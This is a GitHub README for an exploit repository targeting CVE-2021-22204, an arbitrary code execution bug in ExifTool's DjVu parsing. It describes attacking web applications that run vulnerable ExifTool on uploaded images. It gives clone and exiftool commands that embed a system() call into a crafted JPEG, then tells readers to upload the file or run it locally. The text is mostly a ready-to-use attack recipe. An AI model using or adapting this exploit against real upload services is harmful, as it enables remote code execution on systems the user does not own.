# JPEG_RCE
Exiftool bug which leads to RCE </br></br>
***CVE-2021-22204 - RCE***

</br>
*REFFERENCE*
 
</br>Related hackerone report : https://hackerone.com/reports/1154542 </br>

*VULNERABILITY*

ExifTool 7.44 to 12.23 has a bug in the DjVu module which allows for arbitrary code execution when parsing malicious images.</br>

*REQUIREMENTS*

if you are using other image ,it should be a valid jpeg/jpg file </br>
You can check that with exiftool </br>
The meta-data should be : </br>
	MIME Type                       : image/jpeg" </br>
</br>
*EXPLOIT VECTOR*

If the web application has a feature of uploading image and if the application is parsing the metadata of the uploaded image file using exiftool, you can always give a try with this exploit </br>
</br>
*NOTE*

The exiftool version should be between  7.44 to 12.23. </br>
</br>
*COMMAND (exploit)* 

`git clone https://github.com/OneSecCyber/JPEG_RCE.git`
</br> 
</br> `cd JPEG_RCE`
</br>
</br> `exiftool -config eval.config runme.jpg -eval='system("ls -la")'`
</br>
It will create malicious jpg file </br>
Upload the file or run the file in you local system to see the magic.. 
</br>
`exiftool runme.jpg `
</br>
